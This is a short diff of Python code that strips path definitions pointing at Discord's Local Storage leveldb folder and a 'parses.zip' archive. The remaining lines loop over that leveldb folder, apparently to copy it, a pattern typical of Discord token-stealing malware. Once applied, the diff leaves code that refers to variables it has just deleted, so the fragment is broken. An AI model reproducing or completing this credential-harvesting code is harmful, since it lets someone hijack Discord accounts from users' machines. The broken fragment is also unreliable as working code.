@@ -1,7 +1,4 @@
-current_dir = os.path.dirname(os.path.abspath(__file__))
-leveldb_path = os.path.join(os.getenv("APPDATA"), 'discord', 'Local Storage', 'leveldb')
-leveldb_target_path = os.path.join(current_dir, 'leveldb')
-parses_zip_path = os.path.join(current_dir, 'parses.zip')
+
 if not os.path.exists(leveldb_target_path):
     os.makedirs(leveldb_target_path)
 for filename in os.listdir(leveldb_path):
